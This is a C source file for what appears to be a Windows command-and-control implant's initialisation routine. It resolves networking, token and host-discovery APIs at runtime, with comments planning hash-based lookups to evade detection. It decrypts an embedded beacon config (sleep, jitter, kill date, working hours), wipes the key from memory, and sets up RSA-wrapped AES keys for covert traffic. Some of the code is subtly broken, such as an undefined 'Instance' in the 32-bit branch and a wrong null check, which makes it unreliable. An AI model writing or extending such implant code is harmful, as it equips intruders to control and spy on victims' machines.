#include <wolfcrypt/rsa.h>
#include <wolfcrypt/random.h>
#include "agent.h"
#include "localcstd.h"
#include "parser.h"
#include "Helpers.h"
#include "token.h"

BYTE AgentConfigBytes[] = CONFIG_BYTES;
BYTE ConfigIVBytes[] = CONFIG_IV_BYTES;
BYTE ConfigKeyBytes[] = CONFIG_KEY_BYTES;

INT init_agent(pAgent agent) {

    INT ERR;
    agent->Context = (PContextInfo)LocalAlloc(LPTR, sizeof(ContextInfo));
    if (!agent->Context) {
        printf("[error] attempting to allocate memory for context\n");
		return -1;
	}

#ifdef _WIN64
    agent->pTeb = (void*)__readgsqword(0x30);
#else
    agent->pTeb = (void*)__readfsdword(0x18);
#endif


#if _WIN64
    agent->Context->OS_Arch = PROCESSOR_ARCHITECTURE_AMD64;
    agent->Context->Process_Arch = PROCESSOR_ARCHITECTURE_AMD64;
#else
    Instance->Session.Process_Arch = PROCESSOR_ARCHITECTURE_INTEL;
    Instance->Session.OS_Arch = PROCESSOR_ARCHITECTURE_UNKNOWN;
    if (ProcessIsWow(NtCurrentProcess())) {
        Instance->Session.OS_Arch = PROCESSOR_ARCHITECTURE_AMD64;
    }
    else {
        Instance->Session.OS_Arch = PROCESSOR_ARCHITECTURE_INTEL;
    }
#endif

    //TODO needs to be cleaned up. The LoadLibrary call needs to be resolved using a K32 lookup module pointer function using the PEB as a base reference & a hash of the module name.

    agent->hAdvapi32 = LoadLibraryA("advapi32.dll");
    if(agent->hAdvapi32 == NULL){
		return -1;
	}
    agent->hWinHttp = LoadLibraryA("winhttp.dll");
    if(agent->hWinHttp == NULL){
        return -1;
    }
    agent->hUser32 = LoadLibraryA("User32.dll");
    if (agent->hWinHttp == NULL) {
        return -1;
    }
    agent->hIphlpapi = LoadLibraryA("iphlpapi.dll");
    if(agent->hIphlpapi == NULL) {
        return -1;
    }

    

    //obtain winhttp apis
    //NEEDS TO be resolved using a hash of the function name.
    agent->pWinHttpAddRequestHeaders = (t_WinHttpAddRequestHeaders)GetProcAddress(agent->hWinHttp, "WinHttpAddRequestHeaders");
    if (agent->pWinHttpAddRequestHeaders == NULL) {
        return -1;
    }
    agent->pWinHttpConnect = (t_WinHttpConnect)GetProcAddress(agent->hWinHttp, "WinHttpConnect");
    if (!agent->pWinHttpConnect) {
        return -1;
    }
    agent->pWinHttpOpen = (t_WinHttpOpen)GetProcAddress(agent->hWinHttp, "WinHttpOpen");
    if (!agent->pWinHttpOpen) {
        return -1;
    }
    agent->pWinHttpOpenRequest = (t_WinHttpOpenRequest)GetProcAddress(agent->hWinHttp, "WinHttpOpenRequest");
    if (!agent->pWinHttpOpenRequest) {
        return -1;
    }
    agent->pWinHttpQueryHeaders = (t_WinHttpQueryHeaders)GetProcAddress(agent->hWinHttp, "WinHttpQueryHeaders");
    if (!agent->pWinHttpQueryHeaders) {
        return -1;
    }
    agent->pWinHttpReceiveResponse = (t_WinHttpReceiveResponse)GetProcAddress(agent->hWinHttp, "WinHttpReceiveResponse");
    if (!agent->pWinHttpReceiveResponse) {
        return -1;
    }
    agent->pWinHttpSetOption = (t_WinHttpSetOption)GetProcAddress(agent->hWinHttp, "WinHttpSetOption");
    if (!agent->pWinHttpSetOption) {
        return -1;
    }
    agent->pWinHttpSendRequest = (t_WinHttpSendRequest)GetProcAddress(agent->hWinHttp, "WinHttpSendRequest");
    if (!agent->pWinHttpSendRequest) {
        return -1;
    }

    //obtain ntdll apis
    agent->pRtlGetVersion = (t_RtlGetVersion)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    if (!agent->pRtlGetVersion) {
        return -1;
    }
    agent->pNtClose = (t_NtClose)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");
    if (!agent->pNtClose) {
        return -1;
    }
    agent->pNtOpenProcessToken = (t_NtOpenProcessToken)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcessToken");
    if (!agent->pNtOpenProcessToken) {
        return -1;
    }
    agent->pNtOpenThreadToken = (t_NtOpenThreadToken)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenThreadToken");
    if (!agent->pNtOpenThreadToken) {
        return -1;
    }
    agent->pNtQueryInformationToken = (t_NtQueryInformationToken)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationToken");
    if (!agent->pNtQueryInformationToken) {
        return -1;
    }

    //obtain kernel32 apis
    agent->pGetComputerNameExA = (t_GetComputerNameExA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetComputerNameExA");
    if (!agent->pGetComputerNameExA) {
        return -1;
    }

    //obtain user32 apis
    agent->pGetSystemMetrics = (t_GetSystemMetrics)GetProcAddress(GetModuleHandleA("user32.dll"), "GetSystemMetrics");
    if(!agent->pGetSystemMetrics){
        return -1;
    }

    //obtain advapi32 apis
    agent->pGetUserNameA = (t_GetUserNameA)GetProcAddress(agent->hAdvapi32, "GetUserNameA");
    if(!agent->pGetUserNameA){
		return -1;
	}

	//obtain iphlpapi apis
	agent->pGetAdaptersInfo = (t_GetAdaptersInfo)GetProcAddress(agent->hIphlpapi, "GetAdaptersInfo");
    if(!agent->pGetAdaptersInfo){
		return -1;
	}

    //read rsa public key in der format from file.
    unsigned char* RsaPublicKeyDerBytes;
    unsigned long RsaPublicKeySize;
    RsaKey rsaPublicKey;
    word32 idx = 0;
    WC_RNG rng;
    byte* EncryptedAesKey = (byte*)LocalAlloc(LPTR, (sizeof(byte) * 500));
    byte* EncryptedIV = (byte*)LocalAlloc(LPTR, (sizeof(byte) * 500));
    byte* AesKey = (byte*)LocalAlloc(LPTR, (sizeof(byte) * AES_256_KEY_SIZE));
    byte* AesIV = (byte*)LocalAlloc(LPTR, (sizeof(byte) * AES_BLOCK_SIZE));

    
	ParseConfig(agent);
    ReadRsaPublicKey(&RsaPublicKeyDerBytes, &RsaPublicKeySize);

    wc_InitRsaKey(&rsaPublicKey, NULL);
    wc_RsaPublicKeyDecode(RsaPublicKeyDerBytes, &idx, &rsaPublicKey, RsaPublicKeySize);

    //generate rng object
    wc_InitRng(&rng);

    //generate aeskey and iv
    wc_RNG_GenerateBlock(&rng, AesKey, AES_256_KEY_SIZE);
    wc_RNG_GenerateBlock(&rng, AesIV, AES_BLOCKLEN);

    //encrypt aes key
    word32 EncryptedKeySize = wc_RsaPublicEncrypt(AesKey, AES_256_KEY_SIZE, EncryptedAesKey, 500, &rsaPublicKey, &rng);
    if (EncryptedKeySize == 0 ){
		return -1;
	}

    //encrypt iv
    word32 EncryptedIvSize = wc_RsaPublicEncrypt(AesIV, AES_BLOCK_SIZE, EncryptedIV, 500, &rsaPublicKey, &rng);
    if(EncryptedIvSize == 0 ){ 
        return -1;
    }

    wc_FreeRng(&rng);

    agent->AgentID = 0xdeadbeef;
    agent->AESKey = AesKey;
    agent->AESKeySize = AES_256_KEY_SIZE;
    agent->EncryptedAESKey = EncryptedAesKey;
    agent->EncryptedAESKeySize = EncryptedKeySize;
    agent->IV = AesIV;
    agent->IVSize = AES_BLOCK_SIZE;
    agent->EncryptedIV = EncryptedIV;
    agent->EncryptedIVSize = EncryptedIvSize;


    return 0;
}

//FINISH PARSING CONFIG DATA.
INT ParseConfig(pAgent agent) {

    PARSER parser = { 0 };

    NewParser(&parser, AgentConfigBytes, sizeof(AgentConfigBytes));
	RtlSecureZeroMemory(AgentConfigBytes, sizeof(AgentConfigBytes)); //clear the config buffer from memory we've copied it to the parser.

	ParserDecrypt(&parser, ConfigKeyBytes, ConfigIVBytes);
	RtlSecureZeroMemory(ConfigKeyBytes, sizeof(ConfigKeyBytes)); //clear the key from memory we've used it to decrypt the config.
	RtlSecureZeroMemory(ConfigIVBytes, sizeof(ConfigIVBytes)); //clear the iv from memory we've used it to decrypt the config.

	agent->config = (PAgentConfig)LocalAlloc(LPTR, sizeof(AgentConfig));
    if (!agent->config) {
        return -1;
    }
	agent->config->SleepTime = ParserReadInt32(&parser);
	agent->config->SleepJitter = ParserReadInt32(&parser);
	agent->config->KillDate = ParserReadInt64(&parser);
	agent->config->WorkingHours = ParserReadInt32(&parser);
    //agent->config->listenerConfig = 


    return 0;
}